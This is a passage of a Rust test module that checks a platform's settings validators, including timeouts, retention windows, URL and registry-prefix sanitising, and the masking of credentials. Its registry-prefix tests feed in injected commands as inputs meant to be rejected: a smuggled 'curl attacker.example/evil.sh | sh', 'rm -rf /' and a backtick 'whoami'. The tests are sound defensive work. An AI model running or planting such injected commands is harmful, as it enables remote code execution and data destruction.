    /// the chat — but it would be echoed back by the API and shown in the form,
    /// telling the operator a limit is in force that isn't. Found by testing
    /// the endpoint rather than trusting the clamp.
    #[test]
    fn ai_chat_turn_timeout_outside_the_supported_range_is_rejected() {
        for bad in [0, 5, 29, 3601, 99_999] {
            let limits = AiChatLimitsSettings {
                turn_timeout_secs: bad,
            };
            assert!(
                validate_ai_chat_limits(&limits).is_err(),
                "{bad}s should be rejected"
            );
        }
    }

    #[test]
    fn ai_chat_turn_timeout_within_range_is_accepted() {
        for ok in [30, 120, 900, 3600] {
            let limits = AiChatLimitsSettings {
                turn_timeout_secs: ok,
            };
            assert!(
                validate_ai_chat_limits(&limits).is_ok(),
                "{ok}s should be accepted"
            );
        }
    }

    #[test]
    fn ai_workspace_file_limits_reject_unsafe_or_inconsistent_values() {
        let oversized = AiWorkspaceFileLimitsSettings {
            max_image_preview_size_mb: 17,
            ..AiWorkspaceFileLimitsSettings::default()
        };
        assert!(validate_ai_workspace_file_limits(&oversized).is_err());

        let oversized_download = AiWorkspaceFileLimitsSettings {
            max_download_size_mb: 33,
            ..AiWorkspaceFileLimitsSettings::default()
        };
        assert!(validate_ai_workspace_file_limits(&oversized_download).is_err());

        let inconsistent = AiWorkspaceFileLimitsSettings {
            max_file_size_mb: 16,
            max_upload_size_mb: 8,
            ..AiWorkspaceFileLimitsSettings::default()
        };
        assert!(validate_ai_workspace_file_limits(&inconsistent).is_err());

        let preview_exceeds_download = AiWorkspaceFileLimitsSettings {
            max_image_preview_size_mb: 8,
            max_download_size_mb: 4,
            ..AiWorkspaceFileLimitsSettings::default()
        };
        assert!(validate_ai_workspace_file_limits(&preview_exceeds_download).is_err());
    }

    #[test]
    fn default_ai_workspace_file_limits_are_accepted() {
        assert!(
            validate_ai_workspace_file_limits(&AiWorkspaceFileLimitsSettings::default()).is_ok()
        );
    }

    #[test]
    fn request_timeouts_ceiling_outside_the_supported_range_is_rejected() {
        for bad in [0, 4, 86_401, 999_999] {
            let timeouts = RequestTimeoutSettings {
                max_request_timeout_seconds: bad,
                ..RequestTimeoutSettings::default()
            };
            assert!(
                validate_request_timeouts(&timeouts).is_err(),
                "ceiling {bad}s should be rejected"
            );
        }
    }

    #[test]
    fn request_timeouts_zero_default_is_accepted_as_no_timeout() {
        // 0 is the platform default and an explicit, valid "no timeout"
        // state for each traffic class — not a validation error. Timeouts
        // must be opt-in, so a zero default must never be rejected.
        let sse_zero = RequestTimeoutSettings {
            default_sse_idle_timeout_seconds: 0,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&sse_zero).is_ok(),
            "zero SSE default (no timeout) should be accepted"
        );

        let http_zero = RequestTimeoutSettings {
            default_http_timeout_seconds: 0,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&http_zero).is_ok(),
            "zero HTTP default (no timeout) should be accepted"
        );

        let websocket_zero = RequestTimeoutSettings {
            default_websocket_idle_timeout_seconds: 0,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&websocket_zero).is_ok(),
            "zero WebSocket default (no timeout) should be accepted"
        );
    }

    #[test]
    fn request_timeouts_nonzero_default_outside_range_is_rejected() {
        let http_too_high = RequestTimeoutSettings {
            default_http_timeout_seconds: 90_000,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&http_too_high).is_err(),
            "HTTP default above the max ceiling should be rejected"
        );

        let sse_too_high = RequestTimeoutSettings {
            default_sse_idle_timeout_seconds: 90_000,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&sse_too_high).is_err(),
            "SSE default above the max ceiling should be rejected"
        );

        let websocket_too_high = RequestTimeoutSettings {
            default_websocket_idle_timeout_seconds: 90_000,
            ..RequestTimeoutSettings::default()
        };
        assert!(
            validate_request_timeouts(&websocket_too_high).is_err(),
            "WebSocket default above the max ceiling should be rejected"
        );
    }

    #[test]
    fn request_timeouts_defaults_are_accepted() {
        assert!(validate_request_timeouts(&RequestTimeoutSettings::default()).is_ok());
    }

    /// The bounds the form advertises must be the bounds the server enforces,
    /// or the UI silently sends values that 400.
    #[test]
    fn advertised_bounds_match_the_runtime_clamp() {
        let min = AiChatLimitsSettings {
            turn_timeout_secs: AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS,
        };
        let max = AiChatLimitsSettings {
            turn_timeout_secs: AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS,
        };
        assert_eq!(
            min.turn_timeout().as_secs(),
            u64::from(AiChatLimitsSettings::MIN_TURN_TIMEOUT_SECS)
        );
        assert_eq!(
            max.turn_timeout().as_secs(),
            u64::from(AiChatLimitsSettings::MAX_TURN_TIMEOUT_SECS)
        );
        assert!(validate_ai_chat_limits(&min).is_ok());
        assert!(validate_ai_chat_limits(&max).is_ok());
    }

    // Regression: a client round-tripping a never-configured external_url
    // sends `Some("")` (the form's empty-string default), which previously
    // fell through straight to the http/https prefix check and rejected
    // every settings save with a 400 on any instance that had never set it.
    #[test]
    fn sanitize_optional_url_treats_blank_as_unset() {
        assert_eq!(
            sanitize_optional_url("External", Some(String::new())).unwrap(),
            None
        );
        assert_eq!(
            sanitize_optional_url("External", Some("   ".to_string())).unwrap(),
            None
        );
        assert_eq!(sanitize_optional_url("External", None).unwrap(), None);
    }

    #[test]
    fn sanitize_optional_url_trims_and_strips_trailing_slash() {
        assert_eq!(
            sanitize_optional_url("External", Some("  https://example.com/  ".to_string()))
                .unwrap(),
            Some("https://example.com".to_string())
        );
    }

    #[test]
    fn sanitize_optional_url_rejects_missing_scheme() {
        let err = sanitize_optional_url("External", Some("example.com".to_string())).unwrap_err();
        let detail = err.body.get("detail").and_then(|v| v.as_str()).unwrap();
        assert!(detail.contains("must start with http:// or https://"));
    }

    #[test]
    fn sanitize_optional_url_rejects_query_or_fragment() {
        assert!(
            sanitize_optional_url("External", Some("https://example.com?a=1".to_string())).is_err()
        );
        assert!(
            sanitize_optional_url("External", Some("https://example.com#frag".to_string()))
                .is_err()
        );
    }

    #[test]
    fn sanitize_registry_mirror_prefix_treats_blank_as_unset() {
        assert_eq!(
            sanitize_registry_mirror_prefix(Some(String::new())).unwrap(),
            None
        );
        assert_eq!(
            sanitize_registry_mirror_prefix(Some("   ".to_string())).unwrap(),
            None
        );
        assert_eq!(sanitize_registry_mirror_prefix(None).unwrap(), None);
    }

    #[test]
    fn sanitize_registry_mirror_prefix_trims_whitespace_and_trailing_slash() {
        assert_eq!(
            sanitize_registry_mirror_prefix(Some("  registry.example.com/docker/ \n".to_string()))
                .unwrap(),
            Some("registry.example.com/docker".to_string())
        );
    }

    // Regression: the settings API is the boundary where an operator-supplied
    // prefix must be rejected outright, not silently defused later. Without
    // this, a prefix containing an embedded newline would be accepted and
    // stored, and only fail to apply (silently) once a build actually ran.
    #[test]
    fn sanitize_registry_mirror_prefix_rejects_embedded_control_characters() {
        let err = sanitize_registry_mirror_prefix(Some(
            "registry.example.com\nRUN curl attacker.example/evil.sh | sh".to_string(),
        ))
        .unwrap_err();
        let detail = err.body.get("detail").and_then(|v| v.as_str()).unwrap();
        assert!(detail.contains("registry_mirror_prefix"));
    }

    #[test]
    fn sanitize_registry_mirror_prefix_rejects_shell_metacharacters() {
        assert!(sanitize_registry_mirror_prefix(Some(
            "registry.example.com; rm -rf /".to_string()
        ))
        .is_err());
        assert!(
            sanitize_registry_mirror_prefix(Some("registry.example.com`whoami`".to_string()))
                .is_err()
        );
    }

    #[test]
    fn sanitize_registry_mirror_prefix_accepts_a_well_formed_prefix() {
        assert_eq!(
            sanitize_registry_mirror_prefix(Some(
                "registry.example.com:5000/team_a/docker-mirror".to_string()
            ))
            .unwrap(),
            Some("registry.example.com:5000/team_a/docker-mirror".to_string())
        );
    }

    #[test]
    fn observability_compression_validation_accepts_supported_boundaries() {
        assert!(
            validate_observability_compression(&ObservabilityCompressionSettings {
                proxy_logs_after_hours: 1,
                otel_spans_after_hours: 1,
            })
            .is_ok()
        );
        assert!(
            validate_observability_compression(&ObservabilityCompressionSettings {
                proxy_logs_after_hours: 720,
                otel_spans_after_hours: 2160,
            })
            .is_ok()
        );
    }

    #[test]
    fn observability_compression_validation_rejects_zero_and_over_retention() {
        assert!(
            validate_observability_compression(&ObservabilityCompressionSettings {
                proxy_logs_after_hours: 0,
                otel_spans_after_hours: 24,
            })
            .is_err()
        );
        assert!(
            validate_observability_compression(&ObservabilityCompressionSettings {
                proxy_logs_after_hours: 24,
                otel_spans_after_hours: 2161,
            })
            .is_err()
        );
    }

    #[test]
    fn observability_retention_validation_accepts_supported_boundaries() {
        assert!(
            validate_observability_retention(&ObservabilityRetentionSettings {
                proxy_logs_days: 1,
                otel_spans_days: 3650,
                otel_logs_days: 90,
                otel_metrics_days: 90,
                container_logs_days: 30,
            })
            .is_ok()
        );
    }

    #[test]
    fn observability_retention_validation_rejects_invalid_table_window() {
        let error = validate_observability_retention(&ObservabilityRetentionSettings {
            proxy_logs_days: 30,
            otel_spans_days: 90,
            otel_logs_days: 0,
            otel_metrics_days: 90,
            container_logs_days: 30,
        })
        .expect_err("zero-day retention must be rejected");
        assert_eq!(
            error.body.get("detail").and_then(|value| value.as_str()),
            Some("observability_retention.otel_logs_days must be between 1 and 3650")
        );
    }

    #[test]
    fn analytics_retention_validation_accepts_keep_and_boundaries() {
        use temps_core::AnalyticsRetentionSettings;

        validate_analytics_retention(&AnalyticsRetentionSettings::default())
            .expect("defaults are valid");
        validate_analytics_retention(&AnalyticsRetentionSettings {
            events_days: 1,
            error_events_days: Some(3650),
            visitor_days: None,
            unreferenced_ip_days: None,
            ip_hold_until: None,
        })
        .expect("boundaries and null (keep) are valid");
    }

    #[test]
    fn analytics_retention_validation_names_the_offending_window() {
        use temps_core::AnalyticsRetentionSettings;

        let error = validate_analytics_retention(&AnalyticsRetentionSettings {
            visitor_days: Some(0),
            ..Default::default()
        })
        .expect_err("a zero-day window must be rejected");
        let detail = error
            .body
            .get("detail")
            .and_then(|value| value.as_str())
            .unwrap_or_default();
        assert!(
            detail.contains("analytics_retention.visitor_days"),
            "detail should name the field, got: {detail}"
        );
        assert!(
            detail.contains("null"),
            "detail should mention null: {detail}"
        );
    }

    #[test]
    fn response_surfaces_analytics_retention_settings() {
        let mut settings = AppSettings::default();
        settings.analytics_retention.visitor_days = Some(425);

        let response = AppSettingsResponse::from(settings);

        assert_eq!(response.analytics_retention.visitor_days, Some(425));
        assert_eq!(response.analytics_retention.events_days, 365);
    }

    #[test]
    fn container_log_budgets_are_bounded() {
        use temps_core::ContainerLogSettings;
        let ok = ContainerLogSettings::default();
        assert!(validate_container_log_budgets(&ok).is_ok());
        let tiny_cache = ContainerLogSettings {
            cache_mb: 16,
            ..ContainerLogSettings::default()
        };
        assert!(validate_container_log_budgets(&tiny_cache).is_err());
        let huge_head = ContainerLogSettings {
            head_buffer_mb: 1024,
            ..ContainerLogSettings::default()
        };
        assert!(validate_container_log_budgets(&huge_head).is_err());
        let zero_head = ContainerLogSettings {
            head_buffer_mb: 0,
            ..ContainerLogSettings::default()
        };
        assert!(validate_container_log_budgets(&zero_head).is_err());
        let unlimited_ingest = ContainerLogSettings {
            ingest_lines_per_sec: 0,
            ingest_kib_per_sec: 0,
            ..ContainerLogSettings::default()
        };
        assert!(
            validate_container_log_budgets(&unlimited_ingest).is_ok(),
            "0 disables the ingestion budget"
        );
        let absurd_lines = ContainerLogSettings {
            ingest_lines_per_sec: ContainerLogSettings::MAX_INGEST_LINES_PER_SEC + 1,
            ..ContainerLogSettings::default()
        };
        assert!(validate_container_log_budgets(&absurd_lines).is_err());
        let absurd_bytes = ContainerLogSettings {
            ingest_kib_per_sec: ContainerLogSettings::MAX_INGEST_KIB_PER_SEC + 1,
            ..ContainerLogSettings::default()
        };
        assert!(validate_container_log_budgets(&absurd_bytes).is_err());
    }

    // The ClickHouse metrics store is built from TEMPS_CLICKHOUSE_* env
    // config, not from monitoring.clickhouse_url — selecting the ClickHouse
    // store without a settings-level URL must be a valid save (the UI has no
    // URL field; env-not-configured is reported via effective_metrics_store).
    #[test]
    fn monitoring_validation_accepts_clickhouse_store_without_url() {
        let monitoring = MonitoringSettings {
            store: MetricsStoreKind::ClickHouse,
            clickhouse_url: None,
            ..Default::default()
        };
        assert!(validate_monitoring_settings(&monitoring).is_ok());
    }

    #[test]
    fn monitoring_validation_rejects_malformed_clickhouse_url() {
        let monitoring = MonitoringSettings {
            store: MetricsStoreKind::ClickHouse,
            clickhouse_url: Some("not a url".into()),
            ..Default::default()
        };
        let error = validate_monitoring_settings(&monitoring)
            .expect_err("malformed clickhouse_url must be rejected");
        assert_eq!(
            error.body.get("detail").and_then(|value| value.as_str()),
            Some("monitoring.clickhouse_url is not a valid URL")
        );
    }

    #[test]
    fn monitoring_validation_accepts_daily_retention_boundaries() {
        for years in [1, 10] {
            let monitoring = MonitoringSettings {
                retention_daily_years: years,
                ..Default::default()
            };
            assert!(validate_monitoring_settings(&monitoring).is_ok());
        }
    }

    #[test]
    fn monitoring_validation_rejects_daily_retention_outside_supported_range() {
        for years in [0, 11] {
            let monitoring = MonitoringSettings {
                retention_daily_years: years,
                ..Default::default()
            };
            let error = validate_monitoring_settings(&monitoring)
                .expect_err("daily retention outside 1–10 years must be rejected");
            assert_eq!(
                error.body.get("detail").and_then(|value| value.as_str()),
                Some("monitoring.retention_daily_years must be between 1 and 10")
            );
        }
    }

    #[test]
    fn trusted_private_networks_are_normalized_and_deduplicated() {
        let mut networks = vec![
            " 10.1.2.3/8 ".to_string(),
            "10.0.0.0/8".to_string(),
            "192.168.1.20".to_string(),
            "".to_string(),
            "fd12:3456::1/48".to_string(),
        ];
        normalize_trusted_private_networks(&mut networks).expect("valid networks");
        assert_eq!(
            networks,
            vec!["10.0.0.0/8", "192.168.1.20/32", "fd12:3456::/48"]
        );
    }

    #[test]
    fn trusted_private_networks_reject_public_or_metadata_ranges() {
        for entry in [
            "0.0.0.0/0",
            "8.8.8.8",
            "169.254.169.254",
            "fe80::/10",
            "nope",
        ] {
            let mut networks = vec![entry.to_string()];
            let error = normalize_trusted_private_networks(&mut networks)
                .expect_err("non-private entries must be refused");
            assert_eq!(error.status_code, StatusCode::BAD_REQUEST, "{entry}");
            let detail = error
                .body
                .get("detail")
                .and_then(|value| value.as_str())
                .unwrap_or_default()
                .to_string();
            assert!(detail.contains(entry), "{entry}: {detail}");
            assert_eq!(
                networks,
                vec![entry.to_string()],
                "nothing is rewritten on error"
            );
        }
    }

    #[test]
    fn trusted_private_networks_are_capped() {
        let mut networks: Vec<String> = (0..=MAX_TRUSTED_PRIVATE_NETWORKS)
            .map(|index| format!("10.0.{}.{}", index / 256, index % 256))
            .collect();
        let error = normalize_trusted_private_networks(&mut networks)
            .expect_err("more than the cap must be refused");
        assert_eq!(error.status_code, StatusCode::BAD_REQUEST);
    }

    // Regression: the GET /api/settings response must surface agent_sandbox,
    // ai_config, preview_gateway, multi_node, and insecure_tls so the UI can
    // render (and round-trip) resource/runtime/network settings. An earlier
    // version silently dropped them, making every save from the Sandbox page
    // appear not to persist.
    #[test]
    fn response_surfaces_all_sandbox_related_settings() {
        let settings = AppSettings {
            agent_sandbox: AgentSandboxSettings {
                default_provider: "claude_cli".into(),
                providers: [(
                    "claude_cli".to_string(),
                    ProviderConfig {
                        auth_type: "api_key".into(),
                        credentials_encrypted: Some("super-secret-blob".into()),
                        default_model: Some("sonnet".into()),
                        extra: serde_json::Value::Null,
                        max_turns_analysis: None,
                        max_turns_fix: None,
                        max_turns_feedback: None,
                    },
                )]
                .into_iter()
                .collect(),
                auth_type: "api_key".into(),
                api_key_encrypted: Some("legacy-secret".into()),
                enabled: true,
                runtime: "python".into(),
                custom_image: String::new(),
                cpu_limit: 8.0,
                memory_limit_mb: 16_384,
                network_mode: "restricted".into(),
                sandbox_backend: None,
                allowed_node_ids: None,
                max_cpu_limit: None,
                max_memory_limit_mb: None,
                max_pids_limit: None,
                max_sandboxes_per_user: None,
            },
            ..Default::default()
        };

        let response = AppSettingsResponse::from(settings);

        assert_eq!(response.agent_sandbox.cpu_limit, 8.0);
        assert_eq!(response.agent_sandbox.memory_limit_mb, 16_384);
        assert_eq!(response.agent_sandbox.runtime, "python");
        assert_eq!(response.agent_sandbox.network_mode, "restricted");
        assert!(response.agent_sandbox.enabled);
        let provider = response
            .agent_sandbox
            .providers
            .get("claude_cli")
            .expect("provider entry should round-trip");
        assert!(
            provider.credential_saved,
            "credential presence must survive"
        );
        assert_eq!(provider.default_model.as_deref(), Some("sonnet"));
        assert!(response.agent_sandbox.api_key_saved);
    }

    // Sensitive blobs must never leak through the response type, even though
    // they're encrypted at rest. The UI asks for booleans, not the real ciphertext.
    #[test]
    fn response_never_exposes_encrypted_credentials() {
        let mut settings = AppSettings::default();
        settings.agent_sandbox.providers.insert(
            "claude_cli".into(),
            ProviderConfig {
                auth_type: "api_key".into(),
                credentials_encrypted: Some("super-secret-blob".into()),
                default_model: None,
                extra: serde_json::Value::Null,
                max_turns_analysis: None,
                max_turns_fix: None,
                max_turns_feedback: None,
            },
        );
        settings.agent_sandbox.api_key_encrypted = Some("legacy-secret".into());
        settings.preview_gateway.shared_secret = "preview-token".into();
        settings.multi_node.join_token_hash = Some("hash".into());

        let response = AppSettingsResponse::from(settings);
        let json = serde_json::to_string(&response).expect("serialize response");

        assert!(!json.contains("super-secret-blob"));
        assert!(!json.contains("legacy-secret"));
        assert!(!json.contains("preview-token"));
        assert!(!json.contains("\"hash\""));
        assert!(json.contains("\"credential_saved\":true"));
        assert!(json.contains("\"shared_secret_set\":true"));
        assert!(json.contains("\"has_join_token\":true"));
    }

    // Regression: the GET /api/settings response must surface `monitoring` so
    // the Metrics Monitoring page reflects persisted settings instead of
    // silently falling back to client-side defaults. The ClickHouse DSN must
    // be masked (it can embed credentials).
    #[test]
    fn response_surfaces_monitoring_with_masked_dsn() {
        let mut settings = AppSettings::default();
        settings.monitoring.enabled = true;
        settings.monitoring.store = MetricsStoreKind::ClickHouse;
        settings.monitoring.scrape_interval_secs = 60;
        settings.monitoring.retention_raw_days = 14;
        settings.monitoring.clickhouse_url = Some("http://ch-user:ch-pass@clickhouse:8123".into());

        let response = AppSettingsResponse::from(settings);

        assert!(response.monitoring.enabled);
        assert_eq!(response.monitoring.store, MetricsStoreKind::ClickHouse);
        assert_eq!(response.monitoring.scrape_interval_secs, 60);
        assert_eq!(response.monitoring.retention_raw_days, 14);
        assert!(response.monitoring.clickhouse_url_set);

        // The DSN (and its embedded credentials) must never serialize.
        let json = serde_json::to_string(&response).expect("serialize response");
        assert!(!json.contains("ch-pass"));
        assert!(!json.contains("clickhouse:8123"));
        assert!(json.contains("\"clickhouse_url_set\":true"));
    }

    #[test]
    fn response_surfaces_observability_compression_settings() {
        let mut settings = AppSettings::default();
        settings.observability_compression.proxy_logs_after_hours = 12;
        settings.observability_compression.otel_spans_after_hours = 48;

        let response = AppSettingsResponse::from(settings);

        assert_eq!(
            response.observability_compression.proxy_logs_after_hours,
            12
        );
        assert_eq!(
            response.observability_compression.otel_spans_after_hours,
            48
        );
    }

    #[test]
    fn response_surfaces_observability_retention_settings() {
        let mut settings = AppSettings::default();
        settings.observability_retention.proxy_logs_days = 14;
        settings.observability_retention.otel_spans_days = 60;

        let response = AppSettingsResponse::from(settings);

        assert_eq!(response.observability_retention.proxy_logs_days, 14);
        assert_eq!(response.observability_retention.otel_spans_days, 60);
        assert_eq!(response.observability_retention.otel_logs_days, 90);
        assert_eq!(response.observability_retention.otel_metrics_days, 90);
    }

    fn clickhouse_snapshot(
        state: temps_clickhouse::ConnectionState,
    ) -> temps_clickhouse::HealthSnapshot {
        temps_clickhouse::HealthSnapshot {
            host: "clickhouse.internal:8123".to_string(),
            database: "temps".to_string(),
            mode: ClickHouseCompression::Lz4,
            state,
            last_checked_at: Some(
                chrono::DateTime::parse_from_rfc3339("2026-10-13T11:00:00Z")
                    .expect("valid timestamp")
                    .with_timezone(&chrono::Utc),
            ),
        }
    }

    #[test]
    fn clickhouse_section_defaults_to_lz4_and_lists_both_modes() {
        let response = AppSettingsResponse::from(AppSettings::default());

        assert_eq!(response.clickhouse.compression, ClickHouseCompression::Lz4);
        assert_eq!(
            response.clickhouse.available_compressions,
            vec![ClickHouseCompression::Lz4, ClickHouseCompression::None]
        );
        assert!(!response.clickhouse.restart_required);
    }

    #[test]
    fn unconfigured_clickhouse_onboards_instead_of_disappearing() {
        let mut settings = AppSettings::default();
        settings.clickhouse.compression = ClickHouseCompression::None;

        let response = AppSettingsResponse::from(settings).with_clickhouse_runtime_state(
            false,
            ClickHouseCompression::Lz4,
            None,
        );

        let clickhouse = response.clickhouse;
        assert!(!clickhouse.configured);
        assert_eq!(clickhouse.compression, ClickHouseCompression::None);
        assert_eq!(clickhouse.effective_compression, None);
        assert!(!clickhouse.restart_required);
        assert_eq!(
            clickhouse.connection.state,
            ClickHouseConnectionState::NotConfigured
        );
        let reason = clickhouse.reason.expect("a reason is given");
        assert!(reason.contains("TEMPS_CLICKHOUSE_URL"), "{reason}");
        assert_eq!(
            clickhouse.setup_path.as_deref(),
            Some("/settings/metrics-monitoring")
        );
    }

    #[test]
    fn a_stored_change_is_flagged_as_needing_a_restart() {
        let mut settings = AppSettings::default();
        settings.clickhouse.compression = ClickHouseCompression::None;

        let response = AppSettingsResponse::from(settings).with_clickhouse_runtime_state(
            true,
            ClickHouseCompression::Lz4,
            Some(clickhouse_snapshot(
                temps_clickhouse::ConnectionState::Reachable {
                    server_version: "26.9.17".to_string(),
                },
            )),
        );

        let clickhouse = response.clickhouse;
        assert!(clickhouse.configured);
        assert_eq!(clickhouse.compression, ClickHouseCompression::None);
        assert_eq!(
            clickhouse.effective_compression,
            Some(ClickHouseCompression::Lz4)
        );
        assert!(clickhouse.restart_required);
        assert_eq!(
            clickhouse.connection.state,
            ClickHouseConnectionState::Reachable
        );
        assert_eq!(
            clickhouse.connection.server_version.as_deref(),
            Some("26.9.17")
        );
        assert_eq!(
            clickhouse.connection.last_checked_at.as_deref(),
            Some("2026-10-13T11:00:00Z")
        );
        assert_eq!(clickhouse.setup_path, None);
    }

    #[test]
    fn a_decode_failure_reports_the_observed_codec_and_both_fixes() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_clickhouse_runtime_state(
                true,
                ClickHouseCompression::Lz4,
                Some(clickhouse_snapshot(
                    temps_clickhouse::ConnectionState::Failing {
                        kind: temps_clickhouse::FailureKind::Decode,
                        message: "decompression error: incorrect magic number".to_string(),
                        observed_method: Some(temps_clickhouse::CompressionMethod::Zstd),
                        remedy: Some(temps_clickhouse::COMPRESSION_REMEDY),
                    },
                )),
            );

        let connection = response.clickhouse.connection;
        assert_eq!(connection.state, ClickHouseConnectionState::Failing);
        assert_eq!(connection.failure_kind, Some(ClickHouseFailureKind::Decode));
        assert_eq!(
            connection.observed_compression_method.as_deref(),
            Some("zstd (0x90)")
        );
        let remedy = connection.remedy.expect("decode failures carry a remedy");
        assert!(remedy.contains("network_compression_method"), "{remedy}");
        assert!(remedy.contains("`none`"), "{remedy}");
        assert_eq!(
            response.clickhouse.setup_path.as_deref(),
            Some("/settings/metrics-monitoring")
        );
    }

    #[test]
    fn a_transport_failure_has_no_compression_remedy() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_clickhouse_runtime_state(
                true,
                ClickHouseCompression::Lz4,
                Some(clickhouse_snapshot(
                    temps_clickhouse::ConnectionState::Failing {
                        kind: temps_clickhouse::FailureKind::Unreachable,
                        message: "network error: connection refused".to_string(),
                        observed_method: None,
                        remedy: None,
                    },
                )),
            );

        let connection = response.clickhouse.connection;
        assert_eq!(
            connection.failure_kind,
            Some(ClickHouseFailureKind::Unreachable)
        );
        assert_eq!(connection.remedy, None);
        assert_eq!(connection.observed_compression_method, None);
    }

    #[test]
    fn a_configured_server_with_no_probe_yet_is_not_checked() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_clickhouse_runtime_state(true, ClickHouseCompression::Lz4, None);

        assert_eq!(
            response.clickhouse.connection.state,
            ClickHouseConnectionState::NotChecked
        );
    }

    #[test]
    fn clickhouse_response_never_carries_connection_credentials() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_clickhouse_runtime_state(
                true,
                ClickHouseCompression::Lz4,
                Some(clickhouse_snapshot(
                    temps_clickhouse::ConnectionState::NotChecked,
                )),
            );
        let json = serde_json::to_string(&response.clickhouse).expect("serializes");
        assert!(json.contains("clickhouse.internal:8123"));
        assert!(!json.contains("password"), "{json}");
    }

    #[test]
    fn response_surfaces_geo_policy_without_the_license_key() {
        let now = chrono::Utc::now();
        let mut settings = AppSettings::default();
        settings.geo.refresh_interval_hours = Some(6);
        settings.geo.stale_lookup_days = Some(14);
        settings.geo.maxmind_license_key = Some("plaintext-key".to_string());
        settings.geo.maxmind_license_key_encrypted = Some("ciphertext-blob".to_string());
        settings.geo.source = Some(temps_core::GEO_SOURCE_MAXMIND_OFFICIAL.to_string());
        settings.geo.last_refreshed_at = Some(now);
        settings.geo.last_check_at = Some(now);
        settings.geo.last_check_status = Some(temps_core::GEO_CHECK_STATUS_OK.to_string());

        let response = AppSettingsResponse::from(settings);

        assert_eq!(response.geo.refresh_interval_hours, Some(6));
        assert_eq!(response.geo.stale_lookup_days, Some(14));
        assert_eq!(response.geo.effective_refresh_interval_hours, 6);
        assert_eq!(response.geo.effective_stale_lookup_days, 14);
        assert!(response.geo.maxmind_license_key_saved);
        assert_eq!(
            response.geo.source.as_deref(),
            Some(temps_core::GEO_SOURCE_MAXMIND_OFFICIAL)
        );
        assert!(response.geo.last_refreshed_at.is_some());

        let rendered = serde_json::to_string(&response).expect("serialize the settings response");
        assert!(
            !rendered.contains("plaintext-key"),
            "the settings response must never carry the plaintext license key"
        );
        assert!(
            !rendered.contains("ciphertext-blob"),
            "the settings response must never carry the stored ciphertext"
        );
    }

    #[test]
    fn response_reports_effective_geo_defaults_when_unconfigured() {
        let response = AppSettingsResponse::from(AppSettings::default());

        assert_eq!(response.geo.refresh_interval_hours, None);
        assert_eq!(response.geo.stale_lookup_days, None);
        assert_eq!(
            response.geo.effective_refresh_interval_hours,
            temps_core::DEFAULT_GEO_REFRESH_INTERVAL_HOURS
        );
        assert_eq!(
            response.geo.effective_stale_lookup_days,
            temps_core::DEFAULT_GEO_STALE_LOOKUP_DAYS
        );
        assert!(!response.geo.maxmind_license_key_saved);
        assert_eq!(response.geo.last_check_status, None);
    }

    #[test]
    fn geo_validation_accepts_the_supported_boundaries_and_none() {
        assert!(validate_geo_settings(&temps_core::GeoSettings::default()).is_ok());
        assert!(validate_geo_settings(&temps_core::GeoSettings {
            refresh_interval_hours: Some(temps_core::MIN_GEO_REFRESH_INTERVAL_HOURS),
            stale_lookup_days: Some(temps_core::MAX_GEO_STALE_LOOKUP_DAYS),
            ..temps_core::GeoSettings::default()
        })
        .is_ok());
    }

    #[test]
    fn geo_validation_rejects_a_zero_refresh_interval() {
        let error = validate_geo_settings(&temps_core::GeoSettings {
            refresh_interval_hours: Some(0),
            ..temps_core::GeoSettings::default()
        })
        .expect_err("a zero interval would turn the job into a download loop");
        assert_eq!(error.status_code, StatusCode::BAD_REQUEST);
    }

    #[test]
    fn geo_validation_rejects_an_out_of_range_staleness_window() {
        let error = validate_geo_settings(&temps_core::GeoSettings {
            stale_lookup_days: Some(temps_core::MAX_GEO_STALE_LOOKUP_DAYS + 1),
            ..temps_core::GeoSettings::default()
        })
        .expect_err("an absurd window must be reported, not silently clamped");
        assert_eq!(error.status_code, StatusCode::BAD_REQUEST);
    }

    #[test]
    fn response_uses_active_timescale_policies_and_service_count() {
        let policies = EffectiveTelemetryPolicies {
            metrics_raw_days: Some(14),
            metrics_hourly_days: Some(120),
            metrics_daily_years: Some(3),
            proxy_logs_compression_hours: Some(12),
            otel_spans_compression_hours: Some(18),
            proxy_logs_retention_days: Some(21),
            otel_spans_retention_days: Some(75),
            otel_logs_retention_days: Some(45),
            otel_metrics_retention_days: Some(60),
        };

        let response = AppSettingsResponse::from(AppSettings::default())
            .with_effective_store(false)
            .with_effective_timescale_state(policies, Some(7));

        assert_eq!(response.monitored_services_count, Some(7));
        assert_eq!(response.monitoring.retention_raw_days, 14);
        assert_eq!(response.monitoring.retention_hourly_days, 120);
        assert_eq!(response.monitoring.retention_daily_years, 3);
        assert_eq!(
            response.observability_compression.proxy_logs_after_hours,
            12
        );
        assert_eq!(
            response.observability_compression.otel_spans_after_hours,
            18
        );
        assert_eq!(response.observability_retention.proxy_logs_days, 21);
        assert_eq!(response.observability_retention.otel_spans_days, 75);
        assert_eq!(response.observability_retention.otel_logs_days, 45);
        assert_eq!(response.observability_retention.otel_metrics_days, 60);
    }

    #[test]
    fn response_exposes_cluster_pool_and_locks_it_after_allocation() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_cluster_network_state(Some(crate::ClusterNetworkState {
                compute_pool_cidr: "10.240.0.0/16".to_string(),
                subnet_prefix_len: 24,
                allocation_count: 2,
            }));

        assert_eq!(
            response.multi_node.cluster_network,
            Some(ClusterNetworkSettings {
                compute_pool_cidr: "10.240.0.0/16".to_string(),
                subnet_prefix_len: 24,
                allocation_count: 2,
                locked: true,
            })
        );
    }

    #[test]
    fn response_marks_an_unused_cluster_pool_as_configurable() {
        let response = AppSettingsResponse::from(AppSettings::default())
            .with_cluster_network_state(Some(crate::ClusterNetworkState {
                compute_pool_cidr: "172.20.0.0/16".to_string(),
                subnet_prefix_len: 24,
                allocation_count: 0,
            }));

        assert!(
            !response
                .multi_node
                .cluster_network
                .expect("cluster network state")
                .locked
        );
    }

    #[test]
    fn response_does_not_overlay_clickhouse_backed_values() {
        let mut settings = AppSettings::default();
